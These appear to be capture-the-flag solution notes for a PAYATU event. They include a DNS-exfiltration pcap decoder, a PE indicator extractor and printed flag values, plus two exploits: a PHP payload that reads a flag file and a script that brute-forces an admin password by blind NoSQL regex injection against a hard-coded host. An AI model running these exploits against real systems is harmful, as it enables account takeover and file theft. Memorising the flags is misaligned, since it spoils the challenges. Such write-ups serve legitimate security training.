# PAYATU

```python
from scapy.all import rdpcap, DNSQR
import re
from binascii import unhexlify

# Load the PCAPNG file (change path if needed)
pcap_file = "kittens.pcapng"
packets = rdpcap(pcap_file)

# Storage for decoded data
decoded_fragments = []

# Regex to match likely hex strings in DNS queries
hex_pattern = re.compile(r"^[0-9a-fA-F]{8,}$")

for pkt in packets:
    if pkt.haslayer(DNSQR):
        query_name = pkt[DNSQR].qname.decode(errors='ignore').strip('.')
        labels = query_name.split('.')

        for label in labels:
            if hex_pattern.match(label):
                try:
                    decoded = unhexlify(label)
                    decoded_fragments.append(decoded)
                except Exception:
                    continue

# Combine all fragments and convert to ASCII if printable
combined = b''.join(decoded_fragments)
printable = ''.join([chr(b) if 32 <= b < 127 else '.' for b in combined])

print(printable)
```

```A__Cat__has_9_Lives
PAYATU{S0_Th3_c47_5p34kS}
```

```
import pefile import re import os import sys import hashlib def extract_strings(filepath, min_length=4): with open(filepath, 'rb') as f: data = f.read() pattern = rb'[\x20-\x7E]{' + str(min_length).encode() + rb',}' return [s.decode('utf-8', errors='ignore') for s in re.findall(pattern, data)] def find_iocs(strings): iocs = { 'ips': [], 'urls': [], 'file_paths': [], 'flag': None } for s in strings: if re.match(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', s): iocs['ips'].append(s) if 'http://' in s or 'https://' in s: iocs['urls'].append(s) if re.search(r'\\Users\\|C:\\|AppData\\|Temp\\', s): iocs['file_paths'].append(s) if 'PAYATU{' in s: iocs['flag'] = s return iocs def hash_file(filepath): with open(filepath, 'rb') as f: data = f.read() return hashlib.sha256(data).hexdigest() def pe_metadata(filepath): try: pe = pefile.PE(filepath) print("\n[+] PE Metadata") print(" Entry Point:", hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)) print(" Image Base:", hex(pe.OPTIONAL_HEADER.ImageBase)) print(" Sections:") for section in pe.sections: print(f" - {section.Name.decode().strip()} | {hex(section.VirtualAddress)} | {section.SizeOfRawData} bytes") except Exception as e: print(f"[!] PE parsing failed: {e}") def main(): if len(sys.argv) != 2: print(f"Usage: python3 {sys.argv[0]} sneaky.exe") sys.exit(1) filepath = sys.argv[1] if not os.path.isfile(filepath): print(f"[!] File '{filepath}' not found.") sys.exit(1) print("[*] Calculating SHA256...") print(" Hash:", hash_file(filepath)) print("\n[*] Extracting strings...") strings = extract_strings(filepath) print(f" Total strings found: {len(strings)}") print("\n[*] Searching for IOCs and flag...") iocs = find_iocs(strings) if iocs['ips']: print(" Found IPs:") for ip in iocs['ips']: print(" -", ip) if iocs['urls']: print(" Found URLs:") for url in iocs['urls']: print(" -", url) if iocs['file_paths']: print(" Found file paths:") for path in iocs['file_paths']: print(" -", path) if iocs['flag']: print(" Found potential flag:", iocs['flag']) pe_metadata(filepath) if __name__ == '__main__': main() ```






```


`<?php readfile("/app/flag/flag.txt");?>`


```Python3_Blind 
import requests
import string
url = "http://13.201.0.183:54805/api/login"
headers = {"Content-Type": "application/json"}
charset = string.ascii_letters + string.digits + string.punctuation
found = ""
max_len = 32  # adjust based on challenge
for i in range(max_len):
    for ch in charset:
        guess = found + ch
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{guess}"}
        }
        r = requests.post(url, json=payload, headers=headers)
        if "Invalid credentials" not in r.text:
            print(f"[+] Found char: {ch} → {guess}")
            found += ch
            # ✅ Full password validation
            test_login = {"username": "admin", "password": found}
            confirm = requests.post(url, json=test_login, headers=headers)
            if "Invalid credentials" not in confirm.text:
                print(f"[!] Login success with password: {found}")
                exit(0)
            break
    else:
        print(f"[!] Exhausted charset. Final guess: {found}")
        break
```
